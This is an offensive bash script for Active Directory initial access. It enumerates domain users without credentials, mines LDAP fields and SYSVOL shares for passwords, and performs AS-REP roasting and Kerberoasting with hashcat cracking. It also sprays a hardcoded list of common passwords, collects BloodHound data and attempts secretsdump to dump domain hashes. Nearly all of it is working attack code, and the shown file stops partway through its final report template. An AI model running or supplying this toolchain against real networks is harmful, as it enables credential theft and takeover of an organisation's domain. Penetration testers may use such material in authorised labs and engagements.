#!/bin/bash
# ad_initial_access_ultimate.sh - Complete AD Attack Surface Enumeration
# Author: Mahdiesta  | Version: 2.0

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

print_banner() {
    echo -e "${CYAN}"
    cat << "EOF"
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║     █████╗ ██████╗     ██╗███╗   ██╗██╗████████╗██╗ █████╗ ██╗            ║
║    ██╔══██╗██╔══██╗    ██║████╗  ██║██║╚══██╔══╝██║██╔══██╗██║            ║
║    ███████║██║  ██║    ██║██╔██╗ ██║██║   ██║   ██║███████║██║            ║
║    ██╔══██║██║  ██║    ██║██║╚██╗██║██║   ██║   ██║██╔══██║██║            ║
║    ██║  ██║██████╔╝    ██║██║ ╚████║██║   ██║   ██║██║  ██║███████╗       ║
║    ╚═╝  ╚═╝╚═════╝     ╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝       ║
║                                                                           ║
║                 ACCESS SUITE - by @Mahdiesta                              ║
║                                                                           ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

print_section() {
    echo -e "\n${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║${NC} ${YELLOW}$1${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
}

print_subsection() {
    echo -e "${BLUE}  ┌─${NC} $1"
}

print_success() {
    echo -e "${GREEN}  │ [✓]${NC} $1"
}

print_fail() {
    echo -e "${RED}  │ [✗]${NC} $1"
}

print_info() {
    echo -e "${YELLOW}  │ [i]${NC} $1"
}

print_critical() {
    echo -e "${RED}  │ [!!!]${NC} ${MAGENTA}$1${NC}"
}

ask_user() {
    echo -e "${CYAN}  │ [?]${NC} $1"
}

# Credential storage
CRED_FILE=""
FOUND_CREDS=()

# Create output directory
OUTDIR="ad_enum_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"/{users,shares,ldap,kerberos,attacks,vulns,credentials,web,misc}

print_banner

# ═══════════════════════════════════════════════════════════════
# TARGET CONFIGURATION
# ═══════════════════════════════════════════════════════════════

print_section "TARGET CONFIGURATION"
read -rp "$(echo -e ${CYAN}Target DC IP: ${NC})" DC
read -rp "$(echo -e ${CYAN}Domain \(e.g., thm.local\): ${NC})" DOMAIN
read -rp "$(echo -e ${CYAN}Username \(leave blank if none\): ${NC})" USER
read -rp "$(echo -e ${CYAN}Password \(leave blank if none\): ${NC})" PASS
read -rp "$(echo -e ${CYAN}Username wordlist path \(optional\): ${NC})" USERLIST

REALM=$(echo "$DOMAIN" | tr '[:lower:]' '[:upper:]')
BASE_DN=$(echo "$DOMAIN" | sed 's/\./,DC=/g; s/^/DC=/')

echo -e "${GREEN}[✓]${NC} Target: $DC"
echo -e "${GREEN}[✓]${NC} Domain: $DOMAIN"
echo -e "${GREEN}[✓]${NC} Base DN: $BASE_DN"
echo -e "${GREEN}[✓]${NC} Output: $OUTDIR"

# Store initial creds if provided
if [ -n "$USER" ] && [ -n "$PASS" ]; then
    echo "$DOMAIN\\$USER:$PASS" >> "$OUTDIR/credentials/valid_creds.txt"
    FOUND_CREDS+=("$DOMAIN\\$USER:$PASS")
fi

# ═══════════════════════════════════════════════════════════════
# PHASE 0: SERVICE DISCOVERY & SECURITY BASELINE
# ═══════════════════════════════════════════════════════════════

print_section "PHASE 0: SERVICE DISCOVERY & SECURITY BASELINE"

print_subsection "Full port scan (all AD services)"
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,5986,9389,1433,1434,3306,5432,8080,8443 -sV -sC "$DC" -oN "$OUTDIR/misc/nmap_full.txt" 2>/dev/null &
NMAP_PID=$!

print_subsection "SMB version & signing status"
nxc smb "$DC" 2>&1 | tee "$OUTDIR/misc/smb_info.txt"
nxc smb "$DC" --gen-relay-list "$OUTDIR/vulns/relay_targets.txt" 2>/dev/null && print_critical "SMB signing NOT enforced - relay attacks possible!" || print_success "SMB signing enforced"

print_subsection "LDAP version & channel binding"
nxc ldap "$DC" 2>&1 | tee "$OUTDIR/misc/ldap_info.txt"

print_subsection "Checking for SMBv1 (EternalBlue)"
nmap -p 445 --script smb-protocols "$DC" 2>/dev/null | grep "SMBv1" && print_critical "SMBv1 enabled - EternalBlue possible!" || print_success "SMBv1 disabled"

print_subsection "Checking for Zerologon vulnerability (CVE-2020-1472)"
python3 -c "import sys; sys.path.append('/usr/share/doc/python3-impacket/examples'); from zerologon_tester import *" 2>/dev/null || print_info "Zerologon checker not found (manual test required)"

wait $NMAP_PID
print_success "Port scan complete"

# ═══════════════════════════════════════════════════════════════
# PHASE 1: UNAUTHENTICATED USER ENUMERATION
# ═══════════════════════════════════════════════════════════════

print_section "PHASE 1: UNAUTHENTICATED USER ENUMERATION"

print_subsection "Method 1: SMB RID Brute Force (Guest)"
nxc smb "$DC" -u 'guest' -p '' --rid-brute 2>/dev/null | grep "SidTypeUser" | awk -F'\\' '{print $2}' | awk '{print $1}' | sort -u > "$OUTDIR/users/rid_guest.txt"
[ -s "$OUTDIR/users/rid_guest.txt" ] && print_success "Found $(wc -l < "$OUTDIR/users/rid_guest.txt") users" || print_fail "Failed"

print_subsection "Method 2: SMB RID Brute Force (Null)"
nxc smb "$DC" -u '' -p '' --rid-brute 2>/dev/null | grep "SidTypeUser" | awk -F'\\' '{print $2}' | awk '{print $1}' | sort -u > "$OUTDIR/users/rid_null.txt"
[ -s "$OUTDIR/users/rid_null.txt" ] && print_success "Found $(wc -l < "$OUTDIR/users/rid_null.txt") users" || print_fail "Failed"

print_subsection "Method 3: LDAP Null Bind (nxc) ★★★"
nxc ldap "$DC" -u '' -p '' --users 2>/dev/null | grep -oP '(?<=\\)[\w\-\.]+(?=\s)' | sort -u > "$OUTDIR/users/ldap_null_nxc.txt"
[ -s "$OUTDIR/users/ldap_null_nxc.txt" ] && print_success "Found $(wc -l < "$OUTDIR/users/ldap_null_nxc.txt") users" || print_fail "Failed"

print_subsection "Method 4: LDAP Guest Bind (nxc) ★★★"
nxc ldap "$DC" -u 'guest' -p '' --users 2>/dev/null | grep -oP '(?<=\\)[\w\-\.]+(?=\s)' | sort -u > "$OUTDIR/users/ldap_guest_nxc.txt"
[ -s "$OUTDIR/users/ldap_guest_nxc.txt" ] && print_success "Found $(wc -l < "$OUTDIR/users/ldap_guest_nxc.txt") users" || print_fail "Failed"

print_subsection "Method 5: LDAP Anonymous Bind (ldapsearch)"
ldapsearch -x -H "ldap://$DC" -b "$BASE_DN" '(objectClass=user)' sAMAccountName 2>/dev/null | grep "sAMAccountName:" | awk '{print $2}' | sort -u > "$OUTDIR/users/ldap_anon.txt"
[ -s "$OUTDIR/users/ldap_anon.txt" ] && print_success "Found $(wc -l < "$OUTDIR/users/ldap_anon.txt") users" || print_fail "Failed"

print_subsection "Method 6: rpcclient (Guest)"
rpcclient -U 'guest%' "$DC" -c 'enumdomusers' 2>/dev/null | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' | sort -u > "$OUTDIR/users/rpc_guest.txt"
[ -s "$OUTDIR/users/rpc_guest.txt" ] && print_success "Found $(wc -l < "$OUTDIR/users/rpc_guest.txt") users" || print_fail "Failed"

print_subsection "Method 7: rpcclient (Null)"
rpcclient -U '' -N "$DC" -c 'enumdomusers' 2>/dev/null | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' | sort -u > "$OUTDIR/users/rpc_null.txt"
[ -s "$OUTDIR/users/rpc_null.txt" ] && print_success "Found $(wc -l < "$OUTDIR/users/rpc_null.txt") users" || print_fail "Failed"

print_subsection "Method 8: Impacket lookupsid"
impacket-lookupsid "$DOMAIN/guest:@$DC" -no-pass 2>/dev/null | grep "SidTypeUser" | awk -F'\\' '{print $2}' | cut -d' ' -f1 | sort -u > "$OUTDIR/users/lookupsid.txt"
[ -s "$OUTDIR/users/lookupsid.txt" ] && print_success "Found $(wc -l < "$OUTDIR/users/lookupsid.txt") users" || print_fail "Failed"

print_subsection "Method 9: enum4linux-ng"
enum4linux-ng -u 'guest' -p '' -U "$DC" 2>/dev/null | grep -oP '(?<=username: ).*' | sort -u > "$OUTDIR/users/enum4linux.txt"
[ -s "$OUTDIR/users/enum4linux.txt" ] && print_success "Found $(wc -l < "$OUTDIR/users/enum4linux.txt") users" || print_fail "Failed"

if [ -n "$USERLIST" ]; then
    print_subsection "Method 10: Kerbrute Username Validation"
    kerbrute userenum -d "$DOMAIN" --dc "$DC" "$USERLIST" -o "$OUTDIR/users/kerbrute_valid.txt" 2>/dev/null && print_success "Kerbrute complete" || print_fail "Kerbrute failed"
fi

# Consolidate
print_subsection "Consolidating all enumerated users"
cat "$OUTDIR/users/"*.txt 2>/dev/null | sort -u > "$OUTDIR/users/all_users.txt"
TOTAL_USERS=$(wc -l < "$OUTDIR/users/all_users.txt")
print_critical "Total unique users discovered: $TOTAL_USERS"

# ═══════════════════════════════════════════════════════════════
# PHASE 2: PASSWORD POLICY & LOCKOUT THRESHOLD (CRITICAL!)
# ═══════════════════════════════════════════════════════════════

print_section "PHASE 2: PASSWORD POLICY ENUMERATION (PRE-SPRAY)"

print_subsection "Checking password policy & lockout threshold"
nxc smb "$DC" -u 'guest' -p '' --pass-pol 2>/dev/null | tee "$OUTDIR/misc/password_policy.txt"

print_subsection "Alternative: rpcclient password policy"
rpcclient -U 'guest%' "$DC" -c 'getdompwinfo' 2>/dev/null | tee -a "$OUTDIR/misc/password_policy.txt"

print_subsection "Alternative: enum4linux password policy"
enum4linux -u 'guest' -p '' -P "$DC" 2>/dev/null | tee -a "$OUTDIR/misc/password_policy.txt"

print_info "Review password policy before spraying to avoid lockouts!"

# ═══════════════════════════════════════════════════════════════
# PHASE 3: LDAP ATTRIBUTE MINING (PASSWORDS IN DESCRIPTIONS!)
# ═══════════════════════════════════════════════════════════════

print_section "PHASE 3: LDAP ATTRIBUTE MINING"

print_subsection "Mining user descriptions (often contain passwords!) ★★★"
ldapsearch -x -H "ldap://$DC" -b "$BASE_DN" '(&(objectClass=user)(description=*))' sAMAccountName description 2>/dev/null | tee "$OUTDIR/ldap/user_descriptions.txt"

# Extract potential passwords from descriptions
grep -iE "pass|pwd|credential|temp|initial|default" "$OUTDIR/ldap/user_descriptions.txt" > "$OUTDIR/credentials/passwords_from_descriptions.txt" 2>/dev/null || true

if [ -s "$OUTDIR/credentials/passwords_from_descriptions.txt" ]; then
    print_critical "Potential passwords found in user descriptions!"
    cat "$OUTDIR/credentials/passwords_from_descriptions.txt"
fi

print_subsection "Checking for AS-REP roastable users (UF_DONT_REQUIRE_PREAUTH)"
nxc ldap "$DC" -u 'guest' -p '' --asreproast "$OUTDIR/kerberos/asrep_users_list.txt" 2>/dev/null && print_success "AS-REP users found" || print_info "No AS-REP users found via guest"

print_subsection "Checking user info field"
ldapsearch -x -H "ldap://$DC" -b "$BASE_DN" '(&(objectClass=user)(info=*))' sAMAccountName info 2>/dev/null > "$OUTDIR/ldap/user_info.txt"

print_subsection "Checking user comment field"
ldapsearch -x -H "ldap://$DC" -b "$BASE_DN" '(&(objectClass=user)(comment=*))' sAMAccountName comment 2>/dev/null > "$OUTDIR/ldap/user_comments.txt"

print_subsection "Checking for admin accounts (adminCount=1)"
ldapsearch -x -H "ldap://$DC" -b "$BASE_DN" '(&(objectClass=user)(adminCount=1))' sAMAccountName 2>/dev/null | grep "sAMAccountName:" | awk '{print $2}' > "$OUTDIR/users/admin_users.txt"
[ -s "$OUTDIR/users/admin_users.txt" ] && print_critical "Found $(wc -l < "$OUTDIR/users/admin_users.txt") admin accounts" || print_info "No admin accounts found"

print_subsection "Checking for disabled accounts"
ldapsearch -x -H "ldap://$DC" -b "$BASE_DN" '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' sAMAccountName 2>/dev/null | grep "sAMAccountName:" | awk '{print $2}' > "$OUTDIR/users/disabled_accounts.txt"

print_subsection "Checking for users with non-expiring passwords"
ldapsearch -x -H "ldap://$DC" -b "$BASE_DN" '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))' sAMAccountName 2>/dev/null | grep "sAMAccountName:" | awk '{print $2}' > "$OUTDIR/users/nonexpiring_passwords.txt"

print_subsection "Checking for service accounts (SPN set)"
ldapsearch -x -H "ldap://$DC" -b "$BASE_DN" '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName 2>/dev/null > "$OUTDIR/ldap/service_accounts.txt"
[ -s "$OUTDIR/ldap/service_accounts.txt" ] && print_success "Service accounts found (potential Kerberoast)" || print_info "No SPNs found"

# ═══════════════════════════════════════════════════════════════
# PHASE 4: SMB SHARE ENUMERATION & DEEP CONTENT SEARCH
# ═══════════════════════════════════════════════════════════════

print_section "PHASE 4: SMB SHARE ENUMERATION"

print_subsection "Enumerating shares (Guest)"
nxc smb "$DC" -u 'guest' -p '' --shares 2>/dev/null | tee "$OUTDIR/shares/shares_guest.txt"

print_subsection "Enumerating shares (Null)"
nxc smb "$DC" -u '' -p '' --shares 2>/dev/null | tee "$OUTDIR/shares/shares_null.txt"

print_subsection "Deep content spider (Guest) - searching for sensitive files"
nxc smb "$DC" -u 'guest' -p '' -M spider_plus -o READ_ONLY=false MAX_FILE_SIZE=50000 2>/dev/null && print_success "Spider complete (check ~/.nxc/)" || print_info "Spider failed"

print_subsection "Searching for GPP passwords (Groups.xml in SYSVOL) ★★★"
smbclient "//$DC/SYSVOL" -U "guest%" -c 'recurse ON; prompt OFF; cd '"$DOMAIN"'; cd Policies; mget *Groups.xml' 2>/dev/null && print_critical "Groups.xml found! Check for cpassword" || print_info "No Groups.xml accessible"

print_subsection "Searching NETLOGON for scripts"
smbclient "//$DC/NETLOGON" -U "guest%" -c 'recurse ON; prompt OFF; mget *.bat *.cmd *.ps1 *.vbs' 2>/dev/null && print_success "Scripts downloaded" || print_info "NETLOGON not accessible"

print_subsection "Pattern matching for sensitive keywords in shares"
nxc smb "$DC" -u 'guest' -p '' -M spider_plus -o PATTERN='password|credential|pwd|secret|backup|config|\.xml|\.ini|\.conf|\.config' 2>/dev/null || print_info "Pattern search unavailable"

print_subsection "Searching for KeePass databases"
nxc smb "$DC" -u 'guest' -p '' -M spider_plus -o PATTERN='\.kdbx|\.kdb' 2>/dev/null && print_critical "KeePass database found!" || print_info "No KeePass databases"

print_subsection "Searching for SSH keys"
nxc smb "$DC" -u 'guest' -p '' -M spider_plus -o PATTERN='id_rsa|id_dsa|\.pem|\.key' 2>/dev/null && print_critical "SSH keys found!" || print_info "No SSH keys found"

print_subsection "Searching for database connection strings"
nxc smb "$DC" -u 'guest' -p '' -M spider_plus -o PATTERN='connectionString|jdbc|Server=|Database=' 2>/dev/null && print_critical "Connection strings found!" || print_info "No connection strings"

# ═══════════════════════════════════════════════════════════════
# PHASE 5: AS-REP ROASTING (NO AUTHENTICATION REQUIRED!)
# ═══════════════════════════════════════════════════════════════

print_section "PHASE 5: AS-REP ROASTING (Unauthenticated)"

if [ -f "$OUTDIR/users/all_users.txt" ] && [ -s "$OUTDIR/users/all_users.txt" ]; then
    print_subsection "Attempting AS-REP roast on all discovered users"
    impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC" -usersfile "$OUTDIR/users/all_users.txt" -no-pass -outputfile "$OUTDIR/attacks/asrep_hashes.txt" 2>/dev/null
    
    if [ -s "$OUTDIR/attacks/asrep_hashes.txt" ]; then
        print_critical "AS-REP roastable users found! Hashes captured"
        HASH_COUNT=$(wc -l < "$OUTDIR/attacks/asrep_hashes.txt")
        print_info "Total hashes: $HASH_COUNT"
        
        print_subsection "Cracking AS-REP hashes with rockyou"
        hashcat -m 18200 "$OUTDIR/attacks/asrep_hashes.txt" /usr/share/wordlists/rockyou.txt --force -o "$OUTDIR/attacks/asrep_cracked.txt" 2>/dev/null &
        HASHCAT_PID=$!
        
        print_info "Hashcat running in background (PID: $HASHCAT_PID)"
        print_info "Continuing enumeration while cracking..."
        
        # Check periodically if cracked
        sleep 5
        if [ -s "$OUTDIR/attacks/asrep_cracked.txt" ]; then
            print_critical "PASSWORDS CRACKED!"
            cat "$OUTDIR/attacks/asrep_cracked.txt"
            
            # Extract credentials
            while IFS= read -r line; do
                user=$(echo "$line" | cut -d':' -f1 | cut -d'$' -f4)
                pass=$(echo "$line" | cut -d':' -f2)
                echo "$DOMAIN\\$user:$pass" >> "$OUTDIR/credentials/valid_creds.txt"
                FOUND_CREDS+=("$DOMAIN\\$user:$pass")
            done < "$OUTDIR/attacks/asrep_cracked.txt"
        fi
    else
        print_info "No AS-REP roastable users found"
    fi
else
    print_fail "No users enumerated - skipping AS-REP roast"
fi

# ═══════════════════════════════════════════════════════════════
# PHASE 6: PASSWORD SPRAYING
# ═══════════════════════════════════════════════════════════════

print_section "PHASE 6: PASSWORD SPRAYING"

if [ -f "$OUTDIR/users/all_users.txt" ] && [ -s "$OUTDIR/users/all_users.txt" ]; then
    # Build password list
    declare -a PASSWORDS=("Password123!" "Welcome1!" "Company123!" "Summer2024!" "Winter2024!" "Spring2024!" "Autumn2024!" "Password1" "P@ssw0rd" "Admin123!" "$DOMAIN!" "$DOMAIN@2024" "123456" "Password1!" "Welcome123!" "Changeme123")
    
    # Add passwords from descriptions if found
    if [ -s "$OUTDIR/credentials/passwords_from_descriptions.txt" ]; then
        while IFS= read -r desc_pass; do
            PASSWORDS+=("$desc_pass")
        done < <(grep -oP '(?<=password: |pwd: |pass: )\S+' "$OUTDIR/credentials/passwords_from_descriptions.txt")
    fi
    
    print_info "Spraying $(echo ${#PASSWORDS[@]}) password(s) across $TOTAL_USERS users"
    print_critical "WARNING: Check password policy to avoid lockouts!"
    
    read -rp "$(echo -e ${YELLOW}  │ Continue with password spray? \(y/n\): ${NC})" SPRAY_CONFIRM
    
    if [[ "$SPRAY_CONFIRM" =~ ^[Yy]$ ]]; then
        for pwd in "${PASSWORDS[@]}"; do
            print_subsection "Spraying: $pwd"
            nxc smb "$DC" -u "$OUTDIR/users/all_users.txt" -p "$pwd" --continue-on-success 2>/dev/null | tee -a "$OUTDIR/attacks/spray_results.txt"
            
            # Extract valid creds
            grep "\[+\]" "$OUTDIR/attacks/spray_results.txt" | tail -1 | while read -r line; do
                if [[ "$line" == *"[+]"* ]]; then
                    user=$(echo "$line" | awk '{print $5}' | cut -d'\\' -f2 | cut -d':' -f1)
                    echo "$DOMAIN\\$user:$pwd" >> "$OUTDIR/credentials/valid_creds.txt"
                    FOUND_CREDS+=("$DOMAIN\\$user:$pwd")
                    print_critical "Valid credential found: $DOMAIN\\$user:$pwd"
                fi
            done
            
            sleep 1 # Small delay between sprays
        done
    else
        print_info "Password spray skipped"
    fi
else
    print_fail "No users enumerated - skipping spray"
fi

# ═══════════════════════════════════════════════════════════════
# CREDENTIAL FEEDBACK CHECKPOINT
# ═══════════════════════════════════════════════════════════════

print_section "CREDENTIAL CHECK & FEEDBACK LOOP"

# Wait for hashcat if still running
if [ -n "$HASHCAT_PID" ]; then
    print_info "Waiting for hashcat to finish..."
    wait $HASHCAT_PID 2>/dev/null || true
    
    # Recheck for cracked passwords
    if [ -s "$OUTDIR/attacks/asrep_cracked.txt" ]; then
        while IFS= read -r line; do
            user=$(echo "$line" | cut -d':' -f1 | cut -d'$' -f4)
            pass=$(echo "$line" | cut -d':' -f2)
            cred="$DOMAIN\\$user:$pass"
            if [[ ! " ${FOUND_CREDS[@]} " =~ " ${cred} " ]]; then
                echo "$cred" >> "$OUTDIR/credentials/valid_creds.txt"
                FOUND_CREDS+=("$cred")
                print_critical "Cracked credential: $cred"
            fi
        done < "$OUTDIR/attacks/asrep_cracked.txt"
    fi
fi

# Deduplicate credentials
[ -f "$OUTDIR/credentials/valid_creds.txt" ] && sort -u "$OUTDIR/credentials/valid_creds.txt" -o "$OUTDIR/credentials/valid_creds.txt"

TOTAL_CREDS=$(wc -l < "$OUTDIR/credentials/valid_creds.txt" 2>/dev/null || echo 0)

if [ "$TOTAL_CREDS" -gt 0 ]; then
    print_critical "════════════════════════════════════════════════════"
    print_critical "  CREDENTIALS DISCOVERED: $TOTAL_CREDS"
    print_critical "════════════════════════════════════════════════════"
    cat "$OUTDIR/credentials/valid_creds.txt"
    print_critical "════════════════════════════════════════════════════"
    
    echo ""
    ask_user "Do you want to use these credentials for authenticated enumeration?"
    read -rp "$(echo -e ${CYAN}  │ \(This includes: Kerberoasting, BloodHound, Deep LDAP, Secretsdump\) \(y/n\): ${NC})" USE_CREDS
    
    if [[ "$USE_CREDS" =~ ^[Yy]$ ]]; then
        # Use first valid credential
        CRED_LINE=$(head -1 "$OUTDIR/credentials/valid_creds.txt")
        USER=$(echo "$CRED_LINE" | cut -d'\\' -f2 | cut -d':' -f1)
        PASS=$(echo "$CRED_LINE" | cut -d':' -f2)
        
        print_success "Using credentials: $DOMAIN\\$USER:$PASS"
        
        # ═══════════════════════════════════════════════════════════════
        # PHASE 7: AUTHENTICATED ENUMERATION
        # ═══════════════════════════════════════════════════════════════
        
        print_section "PHASE 7: AUTHENTICATED ENUMERATION"
        
        print_subsection "Full LDAP user dump"
        nxc ldap "$DC" -u "$USER" -p "$PASS" --users > "$OUTDIR/ldap/authenticated_users_full.txt"
        
        print_subsection "Enumerating all groups"
        nxc ldap "$DC" -u "$USER" -p "$PASS" --groups > "$OUTDIR/ldap/groups.txt"
        
        print_subsection "Enumerating computers"
        nxc ldap "$DC" -u "$USER" -p "$PASS" --computers > "$OUTDIR/ldap/computers.txt"
        
        print_subsection "Checking for high-value group memberships"
        for group in "Domain Admins" "Enterprise Admins" "Administrators" "Backup Operators" "Account Operators" "Server Operators" "Print Operators" "DnsAdmins"; do
            ldapsearch -x -H "ldap://$DC" -D "$USER@$DOMAIN" -w "$PASS" -b "$BASE_DN" "(&(objectClass=group)(cn=$group))" member 2>/dev/null > "$OUTDIR/ldap/group_$group.txt"
        done
        
        print_subsection "Checking for users with SPNs (authenticated)"
        ldapsearch -x -H "ldap://$DC" -D "$USER@$DOMAIN" -w "$PASS" -b "$BASE_DN" '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName 2>/dev/null > "$OUTDIR/ldap/spn_users_auth.txt"
        
        # ═══════════════════════════════════════════════════════════════
        # PHASE 8: KERBEROASTING (AUTHENTICATED)
        # ═══════════════════════════════════════════════════════════════
        
        print_section "PHASE 8: KERBEROASTING (Authenticated)"
        
        print_subsection "Requesting TGS for all SPNs (Kerberoasting)"
        impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" -request -outputfile "$OUTDIR/attacks/kerberoast_hashes.txt" 2>/dev/null
        
        if [ -s "$OUTDIR/attacks/kerberoast_hashes.txt" ]; then
            print_critical "Kerberoast hashes captured!"
            
            print_subsection "Cracking Kerberoast hashes with rockyou"
            hashcat -m 13100 "$OUTDIR/attacks/kerberoast_hashes.txt" /usr/share/wordlists/rockyou.txt --force -o "$OUTDIR/attacks/kerberoast_cracked.txt" 2>/dev/null && print_success "Cracking complete" || print_info "Cracking in progress..."
            
            if [ -s "$OUTDIR/attacks/kerberoast_cracked.txt" ]; then
                print_critical "KERBEROAST PASSWORDS CRACKED!"
                cat "$OUTDIR/attacks/kerberoast_cracked.txt"
            fi
        else
            print_info "No kerberoastable accounts found"
        fi
        
        # ═══════════════════════════════════════════════════════════════
        # PHASE 9: BLOODHOUND COLLECTION
        # ═══════════════════════════════════════════════════════════════
        
        print_section "PHASE 9: BLOODHOUND DATA COLLECTION"
        
        print_subsection "Running bloodhound-python (all collection methods)"
        bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -ns "$DC" -c all --zip 2>/dev/null && print_success "BloodHound data collected" || print_fail "BloodHound collection failed"
        
        mv *.zip "$OUTDIR/misc/" 2>/dev/null || true
        
        # ═══════════════════════════════════════════════════════════════
        # PHASE 10: PRIVILEGE CHECKS & SECRETSDUMP
        # ═══════════════════════════════════════════════════════════════
        
        print_section "PHASE 10: PRIVILEGE ESCALATION CHECKS"
        
        print_subsection "Checking for local admin rights"
        nxc smb "$DC" -u "$USER" -p "$PASS" --local-auth 2>/dev/null && print_critical "User is local admin!" || print_info "Not local admin"
        
        print_subsection "Attempting secretsdump (requires admin)"
        impacket-secretsdump "$DOMAIN/$USER:$PASS@$DC" > "$OUTDIR/attacks/secretsdump.txt" 2>/dev/null && print_critical "SECRETSDUMP SUCCESSFUL - Domain hashes dumped!" || print_info "Secretsdump failed (need admin)"
        
        print_subsection "Checking for delegation (unconstrained/constrained)"
        ldapsearch -x -H "ldap://$DC" -D "$USER@$DOMAIN" -w "$PASS" -b "$BASE_DN" '(userAccountControl:1.2.840.113556.1.4.803:=524288)' sAMAccountName 2>/dev/null > "$OUTDIR/vulns/unconstrained_delegation.txt"
        [ -s "$OUTDIR/vulns/unconstrained_delegation.txt" ] && print_critical "Unconstrained delegation found!" || print_info "No unconstrained delegation"
        
        print_subsection "Checking for LAPS passwords (if readable)"
        nxc ldap "$DC" -u "$USER" -p "$PASS" -M laps 2>/dev/null && print_critical "LAPS passwords accessible!" || print_info "No LAPS access"
        
        print_subsection "Checking for GPO modification rights"
        # This requires more complex checks - placeholder
        print_info "Manual GPO rights check required (use BloodHound)"
        
    else
        print_info "Authenticated enumeration skipped"
    fi
else
    print_info "No credentials discovered - skipping authenticated enumeration"
    print_info "Consider:"
    print_info "  - Manual hashcat with custom wordlists/rules"
    print_info "  - Web application enumeration"
    print_info "  - Social engineering"
fi

# ═══════════════════════════════════════════════════════════════
# PHASE 11: ADDITIONAL VULNERABILITY CHECKS
# ═══════════════════════════════════════════════════════════════

print_section "PHASE 11: VULNERABILITY & MISCONFIGURATION CHECKS"

print_subsection "Checking for PrintNightmare (CVE-2021-34527)"
rpcclient -U 'guest%' "$DC" -c 'enumprivs' 2>/dev/null | grep -i "SePrintOperatorPrivilege" && print_critical "Print Operators detected - PrintNightmare possible!" || print_info "No Print Operators"

print_subsection "Checking for noPac (CVE-2021-42278/42287)"
nxc smb "$DC" -u 'guest' -p '' -M nopac 2>/dev/null && print_critical "noPac vulnerability detected!" || print_info "Not vulnerable to noPac"

print_subsection "Checking for PetitPotam coercion"
print_info "Manual PetitPotam test required (use ntlmrelayx + PetitPotam.py)"

print_subsection "Checking for ADCS (Certificate Services)"
certipy find -u 'guest@'"$DOMAIN" -p '' -dc-ip "$DC" -vulnerable -stdout 2>/dev/null > "$OUTDIR/vulns/adcs.txt" && print_success "ADCS enumeration complete" || print_info "ADCS enum failed"

print_subsection "Checking for IPv6 DNS takeover potential"
print_info "Run mitm6 if on local network segment"

print_subsection "Checking for LLMNR/NBT-NS"
print_info "Run responder if on local network segment"

print_subsection "DNS zone transfer attempt"
dig axfr "@$DC" "$DOMAIN" > "$OUTDIR/misc/dns_zone.txt" 2>/dev/null && print_critical "DNS zone transfer successful!" || print_info "Zone transfer denied"

# ═══════════════════════════════════════════════════════════════
# PHASE 12: WEB SERVICES & ADDITIONAL PROTOCOLS
# ═══════════════════════════════════════════════════════════════

print_section "PHASE 12: WEB & SERVICE ENUMERATION"

print_subsection "Checking for HTTP services"
curl -sSk "http://$DC" > "$OUTDIR/web/http.html" 2>/dev/null && print_success "HTTP service detected" || print_info "No HTTP"

print_subsection "Checking for HTTPS services"
curl -sSk "https://$DC" > "$OUTDIR/web/https.html" 2>/dev/null && print_success "HTTPS service detected" || print_info "No HTTPS"

print_subsection "Checking MSSQL (1433)"
nxc mssql "$DC" -u 'sa' -p '' 2>/dev/null && print_critical "MSSQL accessible with default creds!" || print_info "MSSQL not accessible"

if [ -n "$USER" ] && [ -n "$PASS" ]; then
    nxc mssql "$DC" -u "$USER" -p "$PASS" 2>/dev/null && print_success "MSSQL accessible with domain creds" || print_info "MSSQL auth failed"
fi

print_subsection "Checking WinRM (5985)"
nxc winrm "$DC" -u 'guest' -p '' 2>/dev/null && print_critical "WinRM accessible!" || print_info "WinRM not accessible"

if [ -n "$USER" ] && [ -n "$PASS" ]; then
    nxc winrm "$DC" -u "$USER" -p "$PASS" 2>/dev/null && print_critical "WinRM accessible with creds!" || print_info "WinRM auth failed"
fi

print_subsection "Checking RDP (3389)"
nxc rdp "$DC" 2>/dev/null && print_success "RDP accessible" || print_info "RDP not accessible"

# ═══════════════════════════════════════════════════════════════
# FINAL REPORT GENERATION
# ═══════════════════════════════════════════════════════════════

print_section "GENERATING FINAL REPORT"

cat > "$OUTDIR/FINAL_REPORT.txt" << EOF
═══════════════════════════════════════════════════════════════════════════
                    AD INITIAL ACCESS - FINAL REPORT
═══════════════════════════════════════════════════════════════════════════

Target Information:
  IP Address: $DC
  Domain: $DOMAIN
  Base DN: $BASE_DN
  Scan Date: $(date)

═══════════════════════════════════════════════════════════════════════════
USER ENUMERATION SUMMARY
═══════════════════════════════════════════════════════════════════════════
  Total Users Discovered: $TOTAL_USERS
  Admin Users: $(wc -l < "$OUTDIR/users/admin_users.txt" 2>/dev/null || echo 0)
  Disabled Accounts: $(wc -l < "$OUTDIR/users/disabled_accounts.txt" 2>/dev/null || echo 0)
  Service Accounts: $(grep -c "servicePrincipalName:" "$OUTDIR/ldap/service_accounts.txt" 2>/dev/null || echo 0)

═══════════════════════════════════════════════════════════════════════════
CREDENTIALS DISCOVERED
═══════════════════════════════════════════════════════════════════════════
  Total Valid Credentials: $TOTAL_CREDS

$([ -f "$OUTDIR/credentials/valid_creds.txt" ] && cat "$OUTDIR/credentials/valid_creds.txt" || echo "  None")

═══════════════════════════════════════════════════════════════════════════
ATTACK OPPORTUNITIES
═══════════════════════════════════════════════════════════════════════════
